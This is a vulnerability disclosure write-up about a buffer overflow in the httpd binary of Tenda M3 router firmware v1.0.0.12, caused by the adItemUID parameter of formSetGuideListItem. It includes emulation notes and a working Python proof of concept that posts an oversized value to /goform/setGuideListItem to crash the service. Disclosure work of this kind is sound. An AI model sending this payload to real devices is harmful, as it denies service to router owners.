# Tenda M3 contains Buffer Overflow Vulnerability

## overview

- type: buffer overflow vulnerability

- supplier: Tenda https://www.tenda.com 

- product: TendaM3 https://www.tenda.com.cn/product/M3.html

- firmware download:   https://www.tenda.com.cn/download/detail-3133.html

- affect version: TendaM3 v1.0.0.12(4856)

## Description

### 1. Vulnerability Details

the `httpd` in directory `/bin` has a buffer overflow. The vunlerability is in fucntion `formSetGuideListItem` 

![image-20220819151053400](readme.assets/image-20220819151053400.png)

In this function, it copies POST parameter `adItemUID` to buffer in `.bss`  

![image-20220819151152576](readme.assets/image-20220819151152576.png)

If `s` is too long, it will causes dos(deny of service)

### 2. Recurring loopholes and POC

use qemu-arm-static to run the `httpd`, we need to patch it before run. 

- in `main` function, The `ConnectCfm` function didn’t work properly, so I patched it to `NOP` 
- The `R7WebsSecurityHandler` function is used for permission control, and I've modified it to access URLs that can only be accessed after login

poc of DOS(deny of service)

```python
import requests

data = {
    "adItemUID": "a"*0x2000
}
cookies = {
    "user": "admin"
}
res = requests.post("http://127.0.0.1/goform/setGuideListItem", data=data, cookies=cookies)
print(res.content)
```

![image-20220819151235474](readme.assets/image-20220819151235474.png)

![image-20220819151254721](readme.assets/image-20220819151254721.png)

![image-20220819151310326](readme.assets/image-20220819151310326.png)

![image-20220819151349492](readme.assets/image-20220819151349492.png)